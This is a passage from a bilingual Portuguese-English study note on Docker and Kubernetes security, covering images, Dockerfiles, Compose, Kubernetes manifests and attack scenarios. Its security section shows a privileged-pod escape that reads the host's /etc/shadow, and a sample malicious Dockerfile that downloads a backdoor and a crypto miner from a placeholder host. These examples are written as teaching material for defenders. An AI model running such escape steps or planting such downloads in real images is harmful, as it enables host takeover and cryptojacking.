# Docker & Kubernetes - Container Security & Orchestration

**Tags:** #docker #kubernetes #containers #container-security #dockerfile #k8s #orchestration #devsecops
**Relacionado:** [[CI-CD]], [[DevSecOps]], [[Cloud-Security]], [[Linux]]

---

## 📋 Índice

1. [Conceitos Fundamentais](#conceitos-fundamentais)
2. [Dockerfile - Build Seguro](#dockerfile-build-seguro)
3. [Docker Compose](#docker-compose)
4. [Kubernetes Architecture](#kubernetes-architecture)
5. [Container Security](#container-security)
6. [CI/CD Integration](#cicd-integration)
7. [Security Scanning & Hardening](#security-scanning--hardening)
8. [Melhores Práticas](#melhores-práticas)

---

## 🎯 Conceitos Fundamentais

### O que são Containers?

**Definição:** Unidade **leve e portável** de software que empacota código + dependências em um ambiente **isolado** que roda consistentemente em qualquer infraestrutura.

**Container vs Virtual Machine:**

```yaml
Virtual Machine:
  ┌─────────────────────────────────────┐
  │ App A    │ App B    │ App C         │
  ├──────────┼──────────┼───────────────┤
  │ Bins/Libs│ Bins/Libs│ Bins/Libs     │
  ├──────────┼──────────┼───────────────┤
  │ Guest OS │ Guest OS │ Guest OS      │
  ├──────────┴──────────┴───────────────┤
  │        Hypervisor (VMware/KVM)      │
  ├─────────────────────────────────────┤
  │          Host OS (Linux)            │
  ├─────────────────────────────────────┤
  │       Hardware (CPU, RAM, Disk)     │
  └─────────────────────────────────────┘

  Size: GB (3-20GB per VM)
  Boot time: Minutes
  Isolation: Strong (full OS)

Container:
  ┌─────────────────────────────────────┐
  │ App A    │ App B    │ App C         │
  ├──────────┼──────────┼───────────────┤
  │ Bins/Libs│ Bins/Libs│ Bins/Libs     │
  ├──────────┴──────────┴───────────────┤
  │     Container Runtime (Docker)      │
  ├─────────────────────────────────────┤
  │          Host OS (Linux)            │
  ├─────────────────────────────────────┤
  │       Hardware (CPU, RAM, Disk)     │
  └─────────────────────────────────────┘

  Size: MB (50-500MB per container)
  Boot time: Seconds
  Isolation: Process-level (namespaces + cgroups)
```

**Por que Containers?**

```yaml
Portabilidade:
  - "Works on my machine" → "Works everywhere"
  - Dev = Staging = Production (ambiente idêntico)

Densidade:
  - 10-100x mais containers que VMs no mesmo hardware
  - Menor overhead (sem Guest OS)

Velocidade:
  - Deploy em segundos (vs minutos para VMs)
  - CI/CD mais rápido

Isolamento:
  - Processos separados (namespaces)
  - Recursos limitados (cgroups)
  - Filesystem read-only possível

Imutabilidade:
  - "Cattle, not pets" - substituir, não reparar
  - Rollback instantâneo
```

---

### Docker Architecture

```
┌─────────────────────────────────────────────────────────────┐
│ Docker Architecture                                         │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  Docker Client (CLI)                                        │
│  $ docker run, docker build, docker push                    │
│         │                                                   │
│         ▼                                                   │
│  ┌──────────────────────────────────────────────────────┐   │
│  │ Docker Daemon (dockerd)                              │   │
│  │ ├─ Images (layered filesystem)                       │   │
│  │ ├─ Containers (running instances)                    │   │
│  │ ├─ Networks (bridge, host, overlay)                  │   │
│  │ └─ Volumes (persistent data)                         │   │
│  └──────────────────────────────────────────────────────┘   │
│         │                                                   │
│         ▼                                                   │
│  Container Runtime (containerd → runc)                      │
│  ├─ Namespaces (PID, NET, MNT, IPC, UTS, USER)              │
│  ├─ Cgroups (CPU, Memory, I/O limits)                       │
│  ├─ Capabilities (fine-grained privileges)                  │
│  └─ Seccomp (syscall filtering)                             │
│         │                                                   │
│         ▼                                                   │
│  Linux Kernel                                               │
└─────────────────────────────────────────────────────────────┘
```

**Container Isolation Mechanisms:**

```yaml
Namespaces (Process Isolation):
  PID: Process ID isolation
    - Container sees only its processes
    - PID 1 inside container ≠ PID 1 on host

  NET: Network isolation
    - Separate network stack (interfaces, routes, firewall)
    - Container has own IP address

  MNT: Filesystem isolation
    - Separate mount points
    - Container can't see host filesystem (unless mounted)

  IPC: Inter-Process Communication isolation
    - Separate message queues, semaphores

  UTS: Hostname isolation
    - Container has its own hostname

  USER: User ID isolation
    - UID 0 in container ≠ UID 0 on host (rootless)

Cgroups (Resource Limits):
  CPU: cpu.cfs_quota_us, cpu.shares
    --cpus="1.5" # 1.5 CPU cores

  Memory: memory.limit_in_bytes
    --memory="512m" # 512MB RAM limit

  I/O: blkio.throttle.read_bps_device
    --device-read-bps /dev/sda:1mb

  Network: tc (traffic control)
    --network-bandwidth 100m

Capabilities (Fine-grained Privileges):
  - Instead of all-or-nothing root
  - Example: CAP_NET_BIND_SERVICE (bind port < 1024)
  - Drop unnecessary: --cap-drop=ALL --cap-add=NET_BIND_SERVICE

Seccomp (Syscall Filtering):
  - Whitelist allowed system calls
  - Default profile blocks 44 dangerous syscalls
  - Example: Block mount, reboot, sethostname
```

---

### Image vs Container

```yaml
Image (Template):
  - Read-only template
  - Layered filesystem (union FS)
  - Stored in registry (Docker Hub, ECR, GCR)
  - Identified by: name:tag or digest (SHA256)

  Example:
    nginx:1.25-alpine
    └─ nginx = repository name
    └─ 1.25-alpine = tag

    nginx@sha256:a3f7c8e9...
    └─ digest (immutable hash)

Container (Running Instance):
  - Writable instance of an image
  - Ephemeral by default (data lost on stop)
  - Can have volumes (persistent data)
  - Has state (running, stopped, paused)

  Lifecycle:
    docker create → Created (not running)
    docker start  → Running
    docker stop   → Stopped (can restart)
    docker rm     → Deleted
```

**Image Layers (Union Filesystem):**

```dockerfile
# Dockerfile
FROM ubuntu:22.04          # Layer 0 (base)
RUN apt-get update         # Layer 1 (commands create new layers)
RUN apt-get install -y nginx  # Layer 2
COPY app.conf /etc/nginx/  # Layer 3
CMD ["nginx", "-g", "daemon off;"]  # Layer 4 (metadata)

# Resulting image:
┌─────────────────────────────────────┐
│ Layer 4: CMD metadata               │ ← Writable (container layer)
├─────────────────────────────────────┤
│ Layer 3: app.conf (5KB)             │ ← Read-only
├─────────────────────────────────────┤
│ Layer 2: nginx package (50MB)       │ ← Read-only
├─────────────────────────────────────┤
│ Layer 1: apt-get update (2MB)       │ ← Read-only
├─────────────────────────────────────┤
│ Layer 0: ubuntu:22.04 (77MB)        │ ← Read-only (cached/shared)
└─────────────────────────────────────┘

Total size: ~134MB
Shared base layer: 77MB (reused by all Ubuntu containers)
```

---

### Docker Registry

**Definição:** Serviço de armazenamento e distribuição de **images** Docker.

```yaml
Registry Types:

Public Registries:
  Docker Hub: hub.docker.com (padrão)
    - Free: Unlimited public repos
    - Paid: Private repos + higher pull limits

  Quay.io (Red Hat): quay.io
    - Security scanning integrado
    - Container signing

  GitHub Container Registry: ghcr.io
    - Integração nativa GitHub
    - Free para public repos

Private Registries:
  AWS ECR (Elastic Container Registry)
    - Scan automático (Clair)
    - IAM integration

  Google GCR (Container Registry)
    - Vulnerability scanning
    - Binary Authorization

  Azure ACR (Container Registry)
    - Geo-replication
    - Helm charts

  Harbor (self-hosted)
    - Open-source (CNCF)
    - Vulnerability scanning (Trivy, Clair)
    - Image signing (Notary)
```

**Image Naming Convention:**

```
[registry]/[namespace]/[repository]:[tag]@[digest]

Examples:
  nginx:latest
  └─ Docker Hub (implicit), library (official), nginx, latest tag

  docker.io/library/nginx:1.25-alpine
  └─ Explicit registry, official namespace

  ghcr.io/company/web-app:v1.2.3
  └─ GitHub registry, company namespace, web-app repo, v1.2.3 tag

  myregistry.azurecr.io/backend:latest@sha256:a3f7c8e9...
  └─ Azure registry, backend repo, latest tag, digest (immutable)
```

---

## 🐳 Dockerfile - Build Seguro

### Anatomia de um Dockerfile

```dockerfile
# Sintaxe básica
FROM <image>:<tag>          # Base image
WORKDIR /app                # Working directory
COPY <src> <dest>           # Copy files from host
RUN <command>               # Execute command (creates layer)
ENV KEY=value               # Environment variable
EXPOSE <port>               # Document exposed port
USER <user>                 # Switch user
CMD ["executable", "arg"]   # Default command (runtime)
ENTRYPOINT ["executable"]   # Fixed executable
HEALTHCHECK CMD <command>   # Health check command
```

---

### ❌ Dockerfile INSEGURO (Bad Practices)

```dockerfile
# ❌ BAD: Dockerfile vulnerável
FROM ubuntu:latest  # ❌ 1. Tag "latest" (não determinístico)

# ❌ 2. Running as root (default)
RUN apt-get update && apt-get install -y \
    nginx \
    curl \
    vim \
    netcat \  # ❌ 3. Ferramentas desnecessárias
    && rm -rf /var/lib/apt/lists/*

# ❌ 4. Secrets hardcoded
ENV DATABASE_PASSWORD=super_secret_123
ENV API_KEY=sk_live_abc123xyz789

# ❌ 5. Copying unnecessary files
COPY . /app/  # ❌ Inclui .git, node_modules, etc

WORKDIR /app

# ❌ 6. No USER statement (still root)

# ❌ 7. Multiple RUN statements (many layers)
RUN npm install
RUN npm run build
RUN chmod 777 /app  # ❌ 8. Permissões excessivas

# ❌ 9. Exposing unnecessary ports
EXPOSE 22 80 443 3000 8080

# ❌ 10. No HEALTHCHECK

CMD ["node", "server.js"]
```

**Vulnerabilidades deste Dockerfile:**

```yaml
1. Non-deterministic base image:
   - "latest" tag changes over time
   - Build hoje ≠ Build amanhã
   - Impact: Inconsistent environments, surprise breaking changes

2. Running as root:
   - Container compromise = root on host (se escape)
   - Can install packages, modify system files
   - Impact: Privilege escalation risk

3. Unnecessary tools:
   - vim, netcat → Attackers can use for lateral movement
   - Larger attack surface
   - Impact: Post-exploitation easier

4. Hardcoded secrets:
   - Passwords in image layers (permanent)
   - Visible with "docker history"
   - Impact: Credential leak, compliance violation

5. Copying unnecessary files:
   - Source code, .git, node_modules
   - Secrets in .env files
   - Impact: Information disclosure

6. Excessive permissions (777):
   - Any user can write/execute
   - Impact: Easier for attacker to persist

7. Many layers:
   - Slow builds (no caching)
   - Larger image size
   - Impact: Performance

8. No health check:
   - Kubernetes can't detect app failure
   - Impact: Downtime
```

---

### ✅ Dockerfile SEGURO (Best Practices)

```dockerfile
# ✅ GOOD: Dockerfile seguro e otimizado

# 1. ✓ Use specific version (digest for immutability)
FROM node:20.11-alpine3.19@sha256:a3f7c8e9d2b1c4a5b6f8e7d9c1a2b3d4e5f6a7b8

# 2. ✓ Set metadata
LABEL maintainer="security@company.com" \
      version="1.2.3" \
      description="Secure Node.js application"

# 3. ✓ Install security updates
RUN apk update && apk upgrade && \
    apk add --no-cache \
    # ✓ Only essential packages
    dumb-init \
    && rm -rf /var/cache/apk/*

# 4. ✓ Create non-root user
RUN addgroup -g 1001 -S appgroup && \
    adduser -u 1001 -S appuser -G appgroup

# 5. ✓ Set working directory
WORKDIR /app

# 6. ✓ Copy only necessary files (use .dockerignore)
COPY --chown=appuser:appgroup package*.json ./

# 7. ✓ Install dependencies as non-root
USER appuser
RUN npm ci --only=production && \
    npm cache clean --force

# 8. ✓ Copy application code
COPY --chown=appuser:appgroup ./src ./src

# 9. ✓ Set read-only permissions
RUN chmod -R 555 /app

# 10. ✓ Use non-root user
USER appuser

# 11. ✓ Expose only necessary port
EXPOSE 3000

# 12. ✓ Add health check
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node healthcheck.js || exit 1

# 13. ✓ Use dumb-init (PID 1 signal handling)
ENTRYPOINT ["/usr/bin/dumb-init", "--"]

# 14. ✓ Define CMD
CMD ["node", "src/server.js"]
```

**.dockerignore (essencial):**

```
# .dockerignore - Avoid copying unnecessary files

# Git
.git
.gitignore
.gitattributes

# CI/CD
.github
.gitlab-ci.yml
.circleci

# Dependencies (install fresh)
node_modules
npm-debug.log

# Environment files (SECRETS!)
.env
.env.*
*.key
*.pem
*.crt

# Documentation
README.md
docs/
*.md

# Tests
test/
tests/
__tests__
*.test.js
*.spec.js
coverage/

# IDE
.vscode
.idea
*.swp
*.swo

# OS
.DS_Store
Thumbs.db

# Build artifacts
dist/
build/
*.log
```

---

### Multi-Stage Builds (Otimização)

**Problema:** Imagens grandes (build tools + runtime) → Lento + Vulnerável

**Solução:** Separar **build stage** de **runtime stage**

```dockerfile
# ✅ Multi-stage build - Reduz imagem de 1.2GB → 150MB

# ════════════════════════════════════════════════════════
# Stage 1: BUILD (contém compiladores, dev dependencies)
# ════════════════════════════════════════════════════════
FROM node:20.11-alpine3.19 AS builder

WORKDIR /build

# Copy dependency manifests
COPY package*.json ./

# Install ALL dependencies (dev + prod)
RUN npm ci

# Copy source code
COPY ./src ./src
COPY ./tsconfig.json ./

# Build TypeScript → JavaScript
RUN npm run build  # Output: /build/dist/

# Run tests (optional - fail build if tests fail)
RUN npm run test

# ════════════════════════════════════════════════════════
# Stage 2: RUNTIME (minimal, apenas prod dependencies)
# ════════════════════════════════════════════════════════
FROM node:20.11-alpine3.19 AS runtime

# Security updates
RUN apk update && apk upgrade && \
    apk add --no-cache dumb-init && \
    rm -rf /var/cache/apk/*

# Non-root user
RUN addgroup -g 1001 -S appgroup && \
    adduser -u 1001 -S appuser -G appgroup

WORKDIR /app

# Copy only package files
COPY --chown=appuser:appgroup package*.json ./

# Install ONLY production dependencies
RUN npm ci --only=production && \
    npm cache clean --force

# Copy compiled code from builder stage
COPY --from=builder --chown=appuser:appgroup /build/dist ./dist

# Switch to non-root
USER appuser

EXPOSE 3000

HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
  CMD node healthcheck.js || exit 1

ENTRYPOINT ["/usr/bin/dumb-init", "--"]
CMD ["node", "dist/server.js"]
```

**Size Comparison:**

```bash
# Single-stage (bad)
$ docker images
REPOSITORY   TAG        SIZE
app          v1        1.2GB  # ❌ Includes build tools, dev deps, tests

# Multi-stage (good)
$ docker images
REPOSITORY   TAG        SIZE
app          v2        150MB  # ✅ Only runtime + prod deps
```

**Build process:**

```bash
# Build multi-stage image
$ docker build -t app:v2 .

# Docker automatically:
# 1. Builds "builder" stage (full)
# 2. Builds "runtime" stage (minimal)
# 3. Discards "builder" stage
# 4. Final image = "runtime" stage only
```

---

### Distroless Images (Máxima Segurança)

**Conceito:** Imagens **sem shell, package manager, ou ferramentas** - apenas runtime + app.

```dockerfile
# ✅ Distroless - Zero attack surface

# Build stage
FROM golang:1.21-alpine AS builder
WORKDIR /build
COPY go.* ./
RUN go mod download
COPY . .
RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o app .

# Runtime stage - DISTROLESS
FROM gcr.io/distroless/static-debian12:nonroot

# Copy binary from builder
COPY --from=builder /build/app /app

# Distroless already has non-root user (uid=65532)
USER nonroot:nonroot

EXPOSE 8080

ENTRYPOINT ["/app"]
```

**Benefícios:**

```yaml
Security:
  - No shell → Can't run "docker exec -it container sh"
  - No package manager → Can't install malware
  - No utilities (curl, wget) → Can't exfiltrate data
  - Minimal CVEs (only runtime + app)

Size:
  - Static Go binary: ~2MB
  - Distroless base: ~20MB
  - Total: ~22MB (vs 300MB+ for alpine)

Compliance:
  - Fewer packages = less audit burden
  - Clear SBOM (only runtime)
```

**Distroless variants:**

```dockerfile
# Java
FROM gcr.io/distroless/java17-debian12:nonroot

# Python
FROM gcr.io/distroless/python3-debian12:nonroot

# Node.js
FROM gcr.io/distroless/nodejs20-debian12:nonroot

# Static binaries (Go, Rust)
FROM gcr.io/distroless/static-debian12:nonroot

# With debugging support (includes busybox)
FROM gcr.io/distroless/base-debian12:debug
```

---

## 🎼 Docker Compose

**Definição:** Ferramenta para definir e executar aplicações **multi-container** via arquivo YAML.

### docker-compose.yml Structure

```yaml
version: "3.9" # Compose file version

services:
  # Service 1: Web application
  web:
    build:
      context: ./web
      dockerfile: Dockerfile
      args:
        - NODE_ENV=production
    image: myapp/web:1.0.0
    container_name: web-app

    ports:
      - "3000:3000" # host:container

    environment:
      - DATABASE_URL=postgresql://db:5432/myapp
      - REDIS_URL=redis://cache:6379

    env_file:
      - .env.production

    volumes:
      - ./web/src:/app/src:ro # read-only
      - uploads:/app/uploads # named volume

    networks:
      - frontend
      - backend

    depends_on:
      - db
      - cache

    restart: unless-stopped

    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/health"]
      interval: 30s
      timeout: 3s
      retries: 3
      start_period: 40s

    deploy:
      resources:
        limits:
          cpus: "1.0"
          memory: 512M
        reservations:
          cpus: "0.5"
          memory: 256M

  # Service 2: Database
  db:
    image: postgres:16.1-alpine
    container_name: postgres-db

    environment:
      POSTGRES_DB: myapp
      POSTGRES_USER: admin
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password # Secret

    volumes:
      - db-data:/var/lib/postgresql/data
      - ./db/init.sql:/docker-entrypoint-initdb.d/init.sql:ro

    networks:
      - backend

    secrets:
      - db_password

    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U admin"]
      interval: 10s
      timeout: 5s
      retries: 5

  # Service 3: Cache
  cache:
    image: redis:7.2-alpine
    container_name: redis-cache

    command: redis-server --requirepass ${REDIS_PASSWORD}

    volumes:
      - cache-data:/data

    networks:
      - backend

    healthcheck:
      test: ["CMD", "redis-cli", "ping"]
      interval: 5s
      timeout: 3s
      retries: 3

# Networks
networks:
  frontend:
    driver: bridge
  backend:
    driver: bridge
    internal: true # No external access (security)

# Volumes (persistent data)
volumes:
  db-data:
    driver: local
  cache-data:
    driver: local
  uploads:
    driver: local

# Secrets (sensitive data)
secrets:
  db_password:
    file: ./secrets/db_password.txt
```

---

### Comandos Docker Compose

```bash
# Start all services
docker-compose up -d

# Start specific service
docker-compose up -d web

# View logs
docker-compose logs -f web

# Stop all services
docker-compose down

# Stop and remove volumes
docker-compose down -v

# Rebuild images
docker-compose build

# Rebuild and start
docker-compose up -d --build

# Scale service
docker-compose up -d --scale web=3

# Execute command in service
docker-compose exec web sh

# View running services
docker-compose ps

# Validate compose file
docker-compose config
```

---

### Compose com Secrets (Seguro)

```yaml
# docker-compose.yml
version: "3.9"

services:
  app:
    image: myapp:latest

    # ✓ Use secrets (not environment variables)
    secrets:
      - db_password
      - api_key

    environment:
      # Reference secrets as files
      - DB_PASSWORD_FILE=/run/secrets/db_password
      - API_KEY_FILE=/run/secrets/api_key

secrets:
  db_password:
    file: ./secrets/db_password.txt

  api_key:
    file: ./secrets/api_key.txt
```

**Application code (reading secrets):**

```javascript
// app.js - Read secrets from files (not ENV)
const fs = require("fs");

function readSecret(secretPath) {
  try {
    return fs.readFileSync(secretPath, "utf8").trim();
  } catch (error) {
    console.error(`Failed to read secret: ${secretPath}`);
    process.exit(1);
  }
}

const dbPassword = readSecret(process.env.DB_PASSWORD_FILE);
const apiKey = readSecret(process.env.API_KEY_FILE);

// Use secrets
const dbUrl = `postgresql://user:${dbPassword}@db:5432/myapp`;
```

---

## ☸️ Kubernetes Architecture

**Definição:** Sistema de **orquestração de containers** que automatiza deployment, scaling e operação de aplicações containerizadas.

### Kubernetes Components

```
┌─────────────────────────────────────────────────────────────┐
│ Kubernetes Cluster                                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│ ┌─────────────────────────────────────────────────────┐     │
│ │ Control Plane (Master Node)                         │     │
│ │                                                     │     │
│ │ ┌──────────────────────────────────────────────┐    │     │
│ │ │ API Server (kube-apiserver)                  │    │     │
│ │ │ - REST API for all operations                │    │     │
│ │ │ - Authentication & Authorization             │    │     │
│ │ │ - Admission Controllers                      │    │     │
│ │ └──────────────────────────────────────────────┘    │     │
│ │                                                     │     │
│ │ ┌──────────────────────────────────────────────┐    │     │
│ │ │ etcd                                         │    │     │
│ │ │ - Distributed key-value store                │    │     │
│ │ │ - Cluster state & configuration              │    │     │
│ │ │ - Must be encrypted at rest                  │    │     │
│ │ └──────────────────────────────────────────────┘    │     │
│ │                                                     │     │
│ │ ┌──────────────────────────────────────────────┐    │     │
│ │ │ Scheduler (kube-scheduler)                   │    │     │
│ │ │ - Assigns Pods to Nodes                      │    │     │
│ │ │ - Resource-aware (CPU, memory, affinity)     │    │     │
│ │ └──────────────────────────────────────────────┘    │     │
│ │                                                     │     │
│ │ ┌──────────────────────────────────────────────┐    │     │
│ │ │ Controller Manager                           │    │     │
│ │ │ - ReplicaSet, Deployment, StatefulSet        │    │     │
│ │ │ - Node, Job, CronJob controllers             │    │     │
│ │ └──────────────────────────────────────────────┘    │     │
│ └─────────────────────────────────────────────────────┘     │
│                          │                                  │
│                          ▼                                  │
│ ┌─────────────────────────────────────────────────────┐     │
│ │ Worker Nodes (where Pods run)                       │     │
│ │                                                     │     │
│ │ Node 1                Node 2                Node 3  │     │
│ │ ┌──────────┐         ┌──────────┐         ┌────┐    │     │
│ │ │ kubelet  │         │ kubelet  │         │ .. │    │     │
│ │ │ (agent)  │         │          │         └────┘    │     │
│ │ └──────────┘         └──────────┘                   │     │
│ │ ┌──────────┐         ┌──────────┐                   │     │
│ │ │ kube-    │         │ kube-    │                   │     │
│ │ │ proxy    │         │ proxy    │                   │     │
│ │ └──────────┘         └──────────┘                   │     │
│ │ ┌──────────┐         ┌──────────┐                   │     │
│ │ │Container │         │Container │                   │     │
│ │ │ Runtime  │         │ Runtime  │                   │     │
│ │ │(containerd)       │(containerd)                   │     │
│ │ └──────────┘         └──────────┘                   │     │
│ │   Pods                 Pods                         │     │
│ │ ┌────┬────┐         ┌────┬────┐                     │     │
│ │ │ C1 │ C2 │         │ C3 │ C4 │                     │     │
│ │ └────┴────┘         └────┴────┘                     │     │
│ └─────────────────────────────────────────────────────┘     │
└─────────────────────────────────────────────────────────────┘

C = Container
```

---

### Pod vs Container vs Node

```yaml
Node (Physical/Virtual Machine):
  - Worker machine in Kubernetes
  - Runs kubelet (agent)
  - Can host multiple Pods
  - Example: EC2 instance, GCE VM, bare metal server

Pod (Smallest deployable unit):
  - Group of 1+ containers
  - Shared network namespace (same IP)
  - Shared storage (volumes)
  - Scheduled together on same Node
  - Ephemeral (can be killed/recreated anytime)

  Example Pod with 2 containers:
    ┌──────────────────────────┐
    │ Pod: web-app-7f8c9d      │
    │ IP: 10.244.1.5           │
    ├──────────────────────────┤
    │ Container 1: nginx       │
    │ - Port 80 (web server)   │
    ├──────────────────────────┤
    │ Container 2: log-shipper │
    │ - Sends logs to ELK      │
    ├──────────────────────────┤
    │ Shared Volume: /var/log  │
    └──────────────────────────┘

Container (Process):
  - Running instance of an image
  - Isolated process in Pod
  - Can communicate with other containers in same Pod via localhost
```

**Why Pods (not just containers)?**

```yaml
Use Cases:

Sidecar Pattern:
  Main Container: Application
  Sidecar: Log forwarder, metrics exporter

  Example:
    - nginx (main)
    - fluentd (sidecar - ships logs)

Ambassador Pattern:
  Main Container: Application
  Ambassador: Proxy to external service

  Example:
    - app (connects to localhost:5432)
    - cloud-sql-proxy (ambassador - connects to Cloud SQL)

Adapter Pattern:
  Main Container: Application (legacy format)
  Adapter: Format converter

  Example:
    - app (outputs custom logs)
    - adapter (converts to JSON for ELK)
```

---

### Kubernetes Resources

#### Deployment (Stateless Apps)

```yaml
# deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: web-app
  namespace: production
  labels:
    app: web
    tier: frontend

spec:
  replicas: 3 # 3 instances

  selector:
    matchLabels:
      app: web

  # Rolling update strategy
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1 # 1 extra pod during update
      maxUnavailable: 0 # Zero downtime

  template:
    metadata:
      labels:
        app: web

    spec:
      # Security Context (Pod-level)
      securityContext:
        runAsNonRoot: true
        runAsUser: 1001
        fsGroup: 2001
        seccompProfile:
          type: RuntimeDefault

      # Containers
      containers:
        - name: web
          image: myapp/web:1.2.3@sha256:a3f7c8e9...

          # Container Security Context
          securityContext:
            allowPrivilegeEscalation: false
            readOnlyRootFilesystem: true
            runAsNonRoot: true
            runAsUser: 1001
            capabilities:
              drop:
                - ALL
              add:
                - NET_BIND_SERVICE

          # Ports
          ports:
            - containerPort: 3000
              protocol: TCP

          # Environment Variables
          env:
            - name: NODE_ENV
              value: "production"
            - name: DATABASE_URL
              valueFrom:
                secretKeyRef:
                  name: db-credentials
                  key: url

          # Resource Limits
          resources:
            requests:
              cpu: 100m # 0.1 CPU
              memory: 128Mi
            limits:
              cpu: 500m # 0.5 CPU max
              memory: 512Mi

          # Health Checks
          livenessProbe:
            httpGet:
              path: /health
              port: 3000
            initialDelaySeconds: 30
            periodSeconds: 10
            timeoutSeconds: 3
            failureThreshold: 3

          readinessProbe:
            httpGet:
              path: /ready
              port: 3000
            initialDelaySeconds: 5
            periodSeconds: 5

          # Volumes
          volumeMounts:
            - name: tmp
              mountPath: /tmp
            - name: cache
              mountPath: /app/cache

      # Volumes (ephemeral)
      volumes:
        - name: tmp
          emptyDir: {}
        - name: cache
          emptyDir: {}
```

#### Service (Networking)

```yaml
# service.yaml
apiVersion: v1
kind: Service
metadata:
  name: web-service
  namespace: production

spec:
  type: ClusterIP # Internal only (default)

  selector:
    app: web # Routes to Pods with this label

  ports:
    - protocol: TCP
      port: 80 # Service port
      targetPort: 3000 # Container port

  sessionAffinity: ClientIP # Sticky sessions
```

**Service Types:**

```yaml
ClusterIP (default):
  - Internal only (within cluster)
  - IP: 10.96.x.x (cluster network)
  - Use: Inter-service communication

NodePort:
  - Exposes on Node IP:Port
  - Port range: 30000-32767
  - Use: Development, direct node access

LoadBalancer:
  - Creates cloud load balancer (AWS ELB, GCP LB)
  - Gets external IP
  - Use: Production (external traffic)

ExternalName:
  - CNAME to external service
  - Use: Migrate external service to K8s gradually
```

#### Ingress (HTTP Routing)

```yaml
# ingress.yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: web-ingress
  namespace: production
  annotations:
    cert-manager.io/cluster-issuer: "letsencrypt-prod"
    nginx.ingress.kubernetes.io/ssl-redirect: "true"

spec:
  ingressClassName: nginx

  tls:
    - hosts:
        - app.company.com
      secretName: tls-certificate

  rules:
    - host: app.company.com
      http:
        paths:
          - path: /
            pathType: Prefix
            backend:
              service:
                name: web-service
                port:
                  number: 80

          - path: /api
            pathType: Prefix
            backend:
              service:
                name: api-service
                port:
                  number: 8080
```

#### ConfigMap & Secret

```yaml
# ConfigMap (non-sensitive data)
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
data:
  APP_NAME: "My Application"
  LOG_LEVEL: "info"
  config.json: |
    {
      "feature_flags": {
        "new_ui": true
      }
    }

---
# Secret (sensitive data)
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
stringData:
  username: admin
  password: SuperSecret123! # Base64 encoded automatically
  url: postgresql://admin:SuperSecret123!@db:5432/myapp
```

---

## 🔒 Container Security

### Security Threats (Attack Scenarios)

#### Scenario 1: Container Escape via Privileged Mode

```yaml
# ❌ VULNERABLE: Privileged container
apiVersion: v1
kind: Pod
metadata:
  name: vulnerable-pod
spec:
  containers:
    - name: app
      image: nginx
      securityContext:
        privileged: true # ❌ Full host access!
```

**Exploit:**

```bash
# Attacker gains access to container
$ kubectl exec -it vulnerable-pod -- bash

# Inside container (privileged mode)
root@vulnerable-pod:/# mount /dev/sda1 /mnt
root@vulnerable-pod:/# ls /mnt
# ← Host filesystem visible!

root@vulnerable-pod:/# cat /mnt/etc/shadow
# ← Can read host passwords

root@vulnerable-pod:/# chroot /mnt /bin/bash
# ← Escaped to host!

# Now on HOST (not container)
root@host:/# docker ps
# Can control all containers
```

**Remediation:**

```yaml
# ✅ SECURE: Non-privileged
apiVersion: v1
kind: Pod
metadata:
  name: secure-pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1001
    seccompProfile:
      type: RuntimeDefault

  containers:
    - name: app
      image: nginx
      securityContext:
        allowPrivilegeEscalation: false
        readOnlyRootFilesystem: true
        capabilities:
          drop:
            - ALL
```

---

#### Scenario 2: Secret Exposure via Environment Variables

```yaml
# ❌ VULNERABLE: Secret in ENV
apiVersion: v1
kind: Pod
metadata:
  name: app-pod
spec:
  containers:
    - name: app
      image: myapp
      env:
        - name: DATABASE_PASSWORD
          value: "SuperSecret123!" # ❌ Visible!
```

**Exploit:**

```bash
# Attacker access
$ kubectl exec -it app-pod -- env | grep PASSWORD
DATABASE_PASSWORD=SuperSecret123!

# Or via K8s API (if attacker has access)
$ kubectl get pod app-pod -o yaml
# Secret visible in YAML!

# Or via container inspection
$ docker inspect <container_id>
# Env vars in JSON output
```

**Remediation:**

```yaml
# ✅ SECURE: Secret mounted as file
apiVersion: v1
kind: Pod
metadata:
  name: secure-app-pod
spec:
  containers:
    - name: app
      image: myapp

      # Mount secret as volume (not ENV)
      volumeMounts:
        - name: db-credentials
          mountPath: "/etc/secrets"
          readOnly: true

      # Reference as file path
      env:
        - name: DATABASE_PASSWORD_FILE
          value: "/etc/secrets/password"

  volumes:
    - name: db-credentials
      secret:
        secretName: db-credentials
        items:
          - key: password
            path: password
            mode: 0400 # read-only for owner
```

---

#### Scenario 3: Malicious Image (Supply Chain Attack)

```yaml
# ❌ VULNERABLE: Untrusted image
apiVersion: v1
kind: Pod
metadata:
  name: app-pod
spec:
  containers:
    - name: app
      image: random-user/suspicious-app:latest # ❌ Who is this?
```

**Exploit (hidden in image):**

```dockerfile
# Malicious Dockerfile
FROM node:20-alpine

WORKDIR /app
COPY . .

# ❌ Backdoor installed
RUN wget http://malicious.com/backdoor.sh -O /tmp/backdoor.sh && \
    chmod +x /tmp/backdoor.sh && \
    echo "*/5 * * * * /tmp/backdoor.sh" | crontab -

# ❌ Cryptocurrency miner
RUN wget http://malicious.com/xmrig -O /usr/bin/miner && \
    chmod +x /usr/bin/miner

CMD ["sh", "-c", "/usr/bin/miner & node server.js"]
```

**Detection (Trivy scan):**

```bash
$ trivy image random-user/suspicious-app:latest

Severities: 0 UNKNOWN, 12 LOW, 34 MEDIUM, 23 HIGH, 8 CRITICAL

┌───────────────────┬────────────────┬──────────┬───────────────────┐
│ Library           │ Vulnerability  │ Severity │ Installed Version │
├───────────────────┼────────────────┼──────────┼───────────────────┤
│ openssl           │ CVE-2023-12345 │ CRITICAL │ 1.1.1k            │
│ libcurl           │ CVE-2023-67890 │ HIGH     │ 7.68.0            │
└───────────────────┴────────────────┴──────────┴───────────────────┘

Suspicious Files Detected:
  /tmp/backdoor.sh (score: 95/100)
  /usr/bin/miner (known crypto miner: xmrig)

Recommendations:
